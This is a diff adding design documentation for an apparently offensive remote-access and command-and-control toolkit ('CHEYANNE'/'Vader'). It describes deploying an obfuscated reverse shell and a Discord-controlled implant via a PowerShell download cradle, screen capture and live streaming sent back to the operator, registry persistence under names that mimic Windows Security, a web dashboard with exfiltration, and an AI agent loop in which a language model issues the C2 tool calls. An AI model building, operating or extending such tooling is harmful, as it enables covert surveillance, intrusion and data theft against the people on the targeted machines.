+    "deploy":     cmd_deploy,
+    "screenshot": cmd_screenshot,
+    "watch":      cmd_watch,
+    "kill":       cmd_kill,
+    "recon":      cmd_recon,
+    "persist":    cmd_persist,
+}
+```
+
+`handle_tcp_command(session, cmd)` splits the input on whitespace, matches the first token against `TCP_SHORTCUTS`, and calls the handler with `(session, *args)`. All shortcuts auto-find the first live TCP session — no `interact` needed.
+
+```
+chey> deploy               Kill old implant + fresh download + launch
+chey> screenshot           Capture screen → HTTP POST back → save + open
+chey> watch                Live screen stream (default refresh interval)
+chey> watch 3              3-second refresh
+chey> kill svchost_update.exe   taskkill on target
+chey> recon                Full target enumeration
+chey> persist              Set dual registry Run keys
+```
+
+### 9.2 Deploy — Dual Payload, Zero Args
+
+**Function:** `cmd_deploy(session, *args)`
+
+Deploy pushes two payloads simultaneously:
+
+| Payload | Binary | C2 Channel |
+|---------|--------|------------|
+| Discord implant | `svchost_health.exe` (PyInstaller) | Discord webhook + bot token |
+| TCP reverse shell | `vader_shell.exe` (compiled C) | TCP :4443 |
+
+The C2 IP is determined automatically via `get_lan_ip()` — iterates network interfaces, picks the first non-127 address. This IP is **XOR-baked** into both payloads at compile time:
+
+- **C shell:** `gen_implant_xor.py --ip <lan_ip>` produces XOR-encoded byte arrays compiled into the binary (key `0x5E`).
+- **Discord implant:** webhook URL, bot token, and C2 host written directly into the Python source before PyInstaller runs.
+
+The operator types `deploy` with zero arguments. The HTTP file server on `:8890` serves both payloads. A PowerShell download cradle is sent to the target session to fetch and execute both.
+
+### 9.3 Screenshot Auto-Pull
+
+**Function:** `cmd_screenshot(session, *args)`
+
+One-shot capture pipeline:
+
+1. `start_screenshot_receiver()` spins up a one-shot HTTP receiver on **port 8891**
+2. PowerShell GDI screenshot command sent to target (`System.Drawing` / `CopyFromScreen`)
+3. Target POSTs raw PNG bytes to `http://<C2_IP>:8891/screenshot`
+4. Receiver saves to `screenshots/screenshot_<timestamp>.png`
+5. `os.startfile()` opens the image in the default viewer
+6. Receiver shuts down after one capture
+
+### 9.4 Watch — Live Screen Stream
+
+**Function:** `cmd_watch(session, *args)`
+
+Three components working in concert:
+
+**Target-side (single PowerShell while-loop):** One command sent to the target runs a `while($true)` loop — capture screen via `System.Drawing`, save to `C:\Users\Public\screen.png` (delete old file first to prevent stale handles), read back with `[System.IO.File]::ReadAllBytes()`, HTTP POST raw bytes to `http://<C2_IP>:8891/screen.png`, sleep N seconds, repeat. Runs until process is killed.
+
+**Receiver (port 8891):** `start_watch_receiver()` — HTTP server that accepts POSTs. Deletes the old frame file before writing the new one (prevents stale cache). Saves to `screenshots/watch_latest.jpg`.
+
+**Viewer (port 8892):** `start_watch_viewer()` — HTTP server serving an auto-refresh HTML page. Uses **fetch + blob URL pattern** instead of `<img src="...">` reload for Safari compatibility (Safari aggressively caches image sources):
+
+```javascript
+setInterval(async () => {
+    const resp = await fetch('/frame?' + Date.now());
+    const blob = await resp.blob();
+    const url = URL.createObjectURL(blob);
+    document.getElementById('frame').src = url;
+}, 2000);
+```
+
+The viewer is HTTP-served (not `file://`) because `file://` broke auto-refresh in most browsers.
+
+### 9.5 Persist — Dual Registry Keys
+
+**Function:** `cmd_persist(session, *args)`
+
+Sets two `HKCU\Software\Microsoft\Windows\CurrentVersion\Run` keys:
+
+| Registry Value Name | Payload | Mimics |
+|---------------------|---------|--------|
+| `WindowsSecurityHealth` | Discord implant (`svchost_health.exe`) | Windows Security |
+| `WindowsSecurityUpdate` | TCP shell (`vader_shell.exe`) | Windows Update |
+
+Both payloads are first copied to `%USERPROFILE%\.local\bin\` (created if it doesn't exist). A PowerShell one-liner runs `reg add` for both keys. No arguments needed — paths are deterministic.
+
+### 9.6 Non-Interactive Mode — `--tcp-cmd`
+
+The `--tcp-cmd` flag enables single-shot command execution from external callers (primarily the web dashboard):
+
+```cmd
+python vader_c2_v2.py --tcp-cmd "deploy"
+python vader_c2_v2.py --tcp-cmd "screenshot"
+python vader_c2_v2.py --tcp-cmd "persist"
+```
+
+When set, the C2 does NOT enter interactive mode. It connects to the listener, selects the active session, calls `handle_tcp_command(session, args.tcp_cmd)`, and exits. This is the bridge between `vader_ui.py` and the C2 — the web UI spawns the process as a subprocess, captures stdout/stderr, and returns JSON to the browser.
+
+---
+
+## 10. HANDLER Kimi K2.5 Backend — `cheyanne_agent.py`
+
+**Purpose:** AI-powered C2 operator with Kimi K2.5 (MoonshotAI) as the reasoning backend, accessed via OpenRouter.
+
+**Why OpenRouter:** The direct `sk-kimi` API key is agent-locked — only whitelisted agents (Kimi CLI, Claude Code) can use `api.kimi.com/coding/v1`. OpenRouter wraps it with a unified key that works from custom code.
+
+**Model:** `moonshotai/kimi-k2.5` — a reasoning model. Reasoning tokens and content tokens are returned separately.
+
+**Launch:**
+```cmd
+python cheyanne_agent.py --kimi     # Kimi K2.5 via OpenRouter
+python cheyanne_agent.py            # Default (Ollama local)
+python cheyanne_agent.py --claude   # Claude API (requires ANTHROPIC_API_KEY)
+```
+
+**API Key:** `OPENROUTER_API_KEY` from environment or `%LOCALAPPDATA%\hermes\.env`.
+
+**Key functions:**
+- `chat_kimi(messages)` — sends chat completion to OpenRouter with `model="moonshotai/kimi-k2.5"`, `max_tokens=4096`
+- `handle_reasoning_response(response)` — handles Kimi's split `reasoning_content` / `content` response format
+- `parse_tool_call(response)` — extracts `<tool>` blocks from AI output, maps to `cheyanne_ops.py` functions
+- `agent_loop()` — REPL: user input -> Kimi -> parse tool calls -> execute -> feed result back -> next round (up to 3 rounds per message)
+
+Tool definitions are passed to Kimi as function schemas. The agent imports all operations from `cheyanne_ops.py` — same execution layer as the terminal menu and web dashboard.
+
+---
+
+## 11. Web Dashboard — `vader_ui.py`
+
+**Purpose:** Browser-based operator interface with full terminal parity. All 4 phases + TCP shortcuts accessible from any device.
+
+**Stack:** Raw Python `http.server` (stdlib only). Custom `VaderHandler(BaseHTTPRequestHandler)`. Dark terminal aesthetic — black background (`#0a0a0a`), green text (`#00ff41`), red accents.
+
+**Port:** 8666
+
+**Routes:**
+| Method | Path | Purpose |
+|--------|------|---------|
+| `GET /` | Main dashboard HTML | Full UI render |
+| `POST /execute` | Phase action dispatch | `{"phase": "...", "action": "..."}` |
+| `POST /tcp` | TCP shortcut dispatch | `{"cmd": "deploy"}` etc. |
+| `GET /sessions` | List active C2 sessions | JSON response |
+| `GET /status` | System status | JSON response |
+
+**Full Terminal Parity:** The web dashboard exposes all 4 phases and all TCP shortcuts:
+- Phase 1 — Build: Compile, scan, mutate, key status
+- Phase 2 — Stealth: Dark room, cloak build/test/activate
+- Phase 3 — Deploy: C2 shell, build implant, auto deploy
+- Phase 4 — Operate: Sessions, screenshot, browse, exfil, upload, recon + all TCP shortcuts (deploy, screenshot, watch, kill, recon, persist)
+
+**TCP command dispatch:** POST to `/tcp` with `{"cmd": "deploy"}` spawns `python vader_c2_v2.py --tcp-cmd "deploy"` as a subprocess, captures output, returns JSON to the browser.
+
+**Mobile Responsive:** Viewport meta tag, CSS media queries at `max-width: 768px` and `480px`, flexbox with `flex-wrap`, minimum 44px tap targets for touch, collapsible sidebar on mobile, horizontal scroll for terminal output on small screens.
+
+---
+
+## 12. Firewall Configuration — `setup_firewall.bat`
+
+**Purpose:** Create permanent Windows Firewall inbound rules for all CHEYANNE ports. Rules survive reboots. Requires admin elevation.
+
+**Ports:**
+
+| Port | Rule Name | Component |
+|------|-----------|-----------|
+| 4443 | CHEYANNE-C2 | TCP C2 listener (reverse shell callback) |
+| 8666 | CHEYANNE-UI | Web dashboard |
+| 8667 | CHEYANNE-AGENT | Binary agent protocol |
+| 8890 | CHEYANNE-SERVE | HTTP file server (payload delivery) |
+| 8891 | CHEYANNE-RECV | Screenshot/Watch receiver (target POST-back) |
+| 8892 | CHEYANNE-WATCH | Watch live viewer (browser auto-refresh) |
+
+The script cleans old rules first (idempotent), then adds all six via `netsh advfirewall firewall add rule`. Run once on a fresh operator machine.
